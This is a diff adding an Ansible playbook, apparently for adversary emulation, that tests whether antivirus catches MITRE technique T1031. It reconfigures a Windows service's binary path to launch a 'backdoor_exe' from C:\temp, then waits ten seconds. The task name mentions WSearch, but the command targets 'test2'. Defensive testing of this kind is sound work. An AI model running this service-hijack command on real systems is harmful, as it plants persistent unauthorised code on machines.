@@ -1,0 +1,14 @@
+# attack_technique: T1031
+- name: T1031 - Modify Existing Service
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+  - name: Modify service path for WSearch service
+    win_command: |
+      sc config test2 binpath= "cmd /c C:\temp\{{ backdoor_exe }}"  
+  
+  - name: sleep for 10 seconds and continue with play to check if AV removed or Not
+    tags: always
+    wait_for: timeout=10
+    delegate_to: localhost	
